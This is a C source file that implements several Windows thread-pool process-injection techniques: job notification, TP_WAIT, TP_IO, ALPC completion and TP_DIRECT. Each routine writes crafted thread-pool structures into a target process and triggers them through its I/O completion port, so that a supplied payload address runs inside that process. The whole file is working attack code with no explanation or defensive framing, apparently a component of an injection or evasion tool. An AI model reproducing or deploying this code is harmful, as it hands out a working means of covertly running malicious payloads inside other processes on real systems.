#include "structs.h"
#include "typedefs.h"
#include "common.h"
#include <stdio.h>

#define MY_MESSAGE "M4rdc0re"

BOOL InjectViaJobCallback(HANDLE targetProcess, PVOID payloadAddress, HANDLE hIoPort) {

	HANDLE hJob = NULL;				
	NTSTATUS status = 0x00;
	PVOID remoteMemory = NULL;			
	PFULL_TP_JOB pFullTpJob = { 0 };
	size_t regionSize = NULL;			
	JOBOBJECT_ASSOCIATE_COMPLETION_PORT completionPort = { 0 };

	fnTpAllocJobNotification pTpAllocJobNotification = (fnTpAllocJobNotification)(GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "TpAllocJobNotification"));

	if (pTpAllocJobNotification == NULL) {
		return FALSE;
	}


	hJob = CreateJobObjectA(NULL, "Job");
	if (hJob == NULL) {
		return FALSE;
	}

	status = pTpAllocJobNotification(&pFullTpJob,hJob,payloadAddress,NULL,NULL);

	if (status != ERROR_SUCCESS) {
		return FALSE;
	}

	remoteMemory = VirtualAllocEx(targetProcess,NULL,sizeof(FULL_TP_JOB),MEM_COMMIT | MEM_RESERVE,PAGE_READWRITE);

	if (remoteMemory == NULL) {
		return FALSE;
	}


	if (!WriteProcessMemory(targetProcess,remoteMemory,pFullTpJob,sizeof(FULL_TP_JOB),NULL)) {
		return FALSE;
	}

	if (!SetInformationJobObject(hJob,JobObjectAssociateCompletionPortInformation,&completionPort,sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT))) {
		return FALSE;
	}

	completionPort.CompletionKey = remoteMemory;
	completionPort.CompletionPort = hIoPort;

	if (!SetInformationJobObject(hJob,JobObjectAssociateCompletionPortInformation,&completionPort,sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT))) {
		return FALSE;
	}

	if (!AssignProcessToJobObject(hJob, GetCurrentProcess())) {
		return FALSE;
	}

	if (TerminateJobObject(hJob, 0)) {
		CloseHandle(hJob);
	}

	return TRUE;
}

BOOL InjectViaTpWait(HANDLE targetProcess, PVOID payloadAddress, HANDLE hIoPort) {

	fnNtAssociateWaitCompletionPacket pNtAssociateWaitCompletionPacket = NULL;

	PFULL_TP_WAIT pTpWait = NULL;		
	PVOID remoteTpWait = NULL;
	PVOID remoteTpDirect = NULL;			
	HANDLE hEvent = NULL;
	NTSTATUS status = ERROR_SUCCESS;

	pNtAssociateWaitCompletionPacket = (fnNtAssociateWaitCompletionPacket)(GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtAssociateWaitCompletionPacket"));

	if (pNtAssociateWaitCompletionPacket == NULL) {
		return FALSE;
	}

	pTpWait = (PFULL_TP_WAIT)CreateThreadpoolWait((PTP_WAIT_CALLBACK)payloadAddress,NULL,NULL);

	if (pTpWait == NULL) {
		return FALSE;
	}

	remoteTpWait = VirtualAllocEx(targetProcess,NULL,sizeof(FULL_TP_WAIT),MEM_COMMIT | MEM_RESERVE,PAGE_READWRITE);

	if (remoteTpWait == NULL) {
		return FALSE;
	}

	if (!WriteProcessMemory(targetProcess,remoteTpWait,pTpWait,sizeof(FULL_TP_WAIT),NULL)) {
		return FALSE;
	}

	remoteTpDirect = VirtualAllocEx(targetProcess,NULL,sizeof(TP_DIRECT),MEM_COMMIT | MEM_RESERVE,PAGE_READWRITE);

	if (remoteTpDirect == NULL) {
		return FALSE;
	}

	if (!WriteProcessMemory(targetProcess,remoteTpDirect,&pTpWait->Direct,sizeof(TP_DIRECT),NULL)) {
		return FALSE;
	}

	hEvent = CreateEventW(NULL, FALSE, FALSE, L"Event Object");
	if (hEvent == NULL) {
		return FALSE;
	}

	status = pNtAssociateWaitCompletionPacket(pTpWait->WaitPkt,hIoPort,hEvent,remoteTpDirect,remoteTpWait,0,0,NULL);

	if (status != ERROR_SUCCESS) {
		return FALSE;
	}

	SetEvent(hEvent);

	return TRUE;
}



BOOL InjectViaTpIo(HANDLE targetProcess, PVOID payloadAddress, HANDLE hIoPort) {

	wchar_t fullFilePath[MAX_PATH] = { 0 };				
	wchar_t tempPath[MAX_PATH] = { 0 };
	HANDLE hFile = NULL;						
	PFULL_TP_IO pTpIo = NULL;
	PVOID pRemoteTpIo = NULL;					
	IO_STATUS_BLOCK ioStatusBlock = { 0 };
	fnNtSetInformationFile pNtSetInformationFile = NULL;		
	FILE_COMPLETION_INFORMATION fileCompletionInfo = { 0 };
	NTSTATUS status = 0x00;						
	uint32_t bytesWritten = NULL;
	OVERLAPPED overlapped = { 0 };

	pNtSetInformationFile = (fnNtSetInformationFile)(GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtSetInformationFile"));

	if (pNtSetInformationFile == NULL) {
		return FALSE;
	}

	if (!GetTempPathW(MAX_PATH, tempPath)) {
		return FALSE;
	}

	if (!GetTempFileNameW(tempPath, L"M4", 0, fullFilePath)) {
		return FALSE;
	}

	hFile = CreateFileW(fullFilePath,GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ | FILE_SHARE_WRITE,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,NULL);

	if (hFile == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	pTpIo = (PFULL_TP_IO)(CreateThreadpoolIo(hFile,(PTP_WIN32_IO_CALLBACK)payloadAddress,NULL,NULL));

	if (pTpIo == NULL) {
		return FALSE;
	}

	pTpIo->CleanupGroupMember.Callback = payloadAddress;
	++(pTpIo->PendingIrpCount);

	pRemoteTpIo = VirtualAllocEx(targetProcess,NULL,sizeof(FULL_TP_IO),MEM_COMMIT | MEM_RESERVE,PAGE_READWRITE);

	if (pRemoteTpIo == NULL) {
		return FALSE;
	}


	if (!WriteProcessMemory(targetProcess,pRemoteTpIo,pTpIo,sizeof(FULL_TP_IO),NULL)) {
		return FALSE;
	}

	fileCompletionInfo.Key = &(((PFULL_TP_IO)pRemoteTpIo)->Direct);
	fileCompletionInfo.Port = hIoPort;

	status = pNtSetInformationFile(hFile,&ioStatusBlock,&fileCompletionInfo,sizeof(FILE_COMPLETION_INFORMATION),(FILE_INFORMATION_CLASS)(61));

	if (status != ERROR_SUCCESS) {
		return FALSE;
	}

	if (!WriteFile(hFile,MY_MESSAGE,sizeof(MY_MESSAGE),NULL,&overlapped) && GetLastError() != ERROR_IO_PENDING) {
		return FALSE;
	}

	return TRUE;
}

void _RtlInitUnicodeString(OUT PUNICODE_STRING UsStruct, IN OPTIONAL PCWSTR Buffer) {

	if ((UsStruct->Buffer = (PWSTR)Buffer)) {

		unsigned int Length = wcslen(Buffer) * sizeof(WCHAR);
		if (Length > 0xfffc) {
			Length = 0xfffc;
		}

		UsStruct->Length = Length;
		UsStruct->MaximumLength = UsStruct->Length + sizeof(WCHAR);
	}

	else UsStruct->Length = UsStruct->MaximumLength = 0;
}

BOOL InjectViaAlpc(HANDLE targetProcess, PVOID payloadAddress, HANDLE hIoPort) {

	NTSTATUS status = 0x00;					
	fnNtAlpcCreatePort pNtAlpcCreatePort = NULL;
	HANDLE hTempApcPort = NULL;				
	fnTpAllocAlpcCompletion pTpAllocAlpcCompletion = NULL;
	PVOID remoteTpAlpc = NULL;				
	fnNtAlpcSetInformation pNtAlpcSetInformation = NULL;
	const PCHAR alpcMessageString = MY_MESSAGE;
	size_t szAlpcMessageString = strlen(alpcMessageString) + 1;
	fnNtAlpcConnectPort pNtAlpcConnectPort = NULL;

	UNICODE_STRING usAlpcPortName = { 0 };			
	PFULL_TP_ALPC pFullTpAlpc = NULL;
	OBJECT_ATTRIBUTES objectAttributes = { 0 };		
	ALPC_PORT_ATTRIBUTES alpcPortAttributes = { 0 };
	HANDLE hRealApcPort = NULL;

	OBJECT_ATTRIBUTES clientAlpcAttributes = { 0 };

	pNtAlpcCreatePort = (fnNtAlpcCreatePort)(GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtAlpcCreatePort"));
	pTpAllocAlpcCompletion = (fnTpAllocAlpcCompletion)(GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "TpAllocAlpcCompletion"));
	pNtAlpcSetInformation = (fnNtAlpcSetInformation)(GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtAlpcSetInformation"));
	pNtAlpcConnectPort = (fnNtAlpcConnectPort)(GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtAlpcConnectPort"));

	if (pNtAlpcCreatePort == NULL || pTpAllocAlpcCompletion == NULL || pNtAlpcSetInformation == NULL || pNtAlpcConnectPort == NULL) {
		return FALSE;
	}

	status = pNtAlpcCreatePort(&hTempApcPort,NULL,NULL);

	if (status != ERROR_SUCCESS) {
		return FALSE;
	}

	status = pTpAllocAlpcCompletion(&pFullTpAlpc,hTempApcPort,(PTP_ALPC_CALLBACK)payloadAddress,NULL,NULL);

	if (status != ERROR_SUCCESS) {
		return FALSE;
	}

	_RtlInitUnicodeString(&usAlpcPortName, L"\\RPC Control\\ApcPort");

	objectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
	objectAttributes.ObjectName = &usAlpcPortName;

	alpcPortAttributes.Flags = 0x20000;
	alpcPortAttributes.MaxMessageLength = 328;

	status = pNtAlpcCreatePort(&hRealApcPort,&objectAttributes,&alpcPortAttributes);

	if (status != ERROR_SUCCESS) {
		return FALSE;
	}

	remoteTpAlpc = VirtualAllocEx(targetProcess,NULL,sizeof(FULL_TP_ALPC),MEM_COMMIT | MEM_RESERVE,PAGE_READWRITE);

	if (remoteTpAlpc == NULL) {
		return FALSE;
	}

	if (!WriteProcessMemory(targetProcess,remoteTpAlpc,pFullTpAlpc,sizeof(FULL_TP_ALPC),NULL)) {
		return FALSE;
	}

	ALPC_PORT_ASSOCIATE_COMPLETION_PORT alpcAssocCompletionPort = { 0 };
	alpcAssocCompletionPort.CompletionKey = remoteTpAlpc;
	alpcAssocCompletionPort.CompletionPort = hIoPort;

	status = pNtAlpcSetInformation(hRealApcPort,2,&alpcAssocCompletionPort,sizeof(ALPC_PORT_ASSOCIATE_COMPLETION_PORT));

	if (status != ERROR_SUCCESS) {
		return FALSE;
	}

	clientAlpcAttributes.Length = sizeof(OBJECT_ATTRIBUTES);

	ALPC_MESSAGE clientAlpcMessage = { 0 };
	clientAlpcMessage.PortHeader.u1.s1.DataLength = szAlpcMessageString;
	clientAlpcMessage.PortHeader.u1.s1.TotalLength = sizeof(PORT_MESSAGE) + szAlpcMessageString;

	memcpy(clientAlpcMessage.PortMessage, alpcMessageString, szAlpcMessageString);
	size_t clientAlpcMessageSize = sizeof(clientAlpcMessage);

	LARGE_INTEGER timeout = { 0 };
	timeout.QuadPart = -10000000;

	HANDLE outHandle = NULL;
	status = pNtAlpcConnectPort(&outHandle,&usAlpcPortName,&clientAlpcAttributes,&alpcPortAttributes,0x20000,NULL,(PPORT_MESSAGE)&clientAlpcMessage,&clientAlpcMessageSize,NULL,NULL,&timeout);

	if (status != ERROR_SUCCESS && status != STATUS_TIMEOUT) {
		return FALSE;
	}


	return TRUE;
}

BOOL InjectViaTpDirect(HANDLE targetProcess, PVOID payloadAddress, HANDLE hIoPort) {

	TP_DIRECT direct = { 0 };
	PVOID remoteTpDirect = NULL;
	fnNtSetIoCompletion pNtSetIoCompletion = NULL;
	NTSTATUS status = ERROR_SUCCESS;

	direct.Callback = payloadAddress;

	remoteTpDirect = VirtualAllocEx(targetProcess,NULL,sizeof(TP_DIRECT),MEM_COMMIT | MEM_RESERVE,PAGE_READWRITE);

	if (remoteTpDirect == NULL) {
		return FALSE;
	}

	if (!WriteProcessMemory(targetProcess,remoteTpDirect,&direct,sizeof(TP_DIRECT),NULL)) {
		return FALSE;
	}

	pNtSetIoCompletion = (fnNtSetIoCompletion)(GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtSetIoCompletion"));
	if (pNtSetIoCompletion == NULL) {
		return FALSE;
	}

	status = pNtSetIoCompletion(hIoPort, remoteTpDirect, 0, 0, 0);
	if (status != ERROR_SUCCESS) {
		return FALSE;
	}

	return TRUE;
}
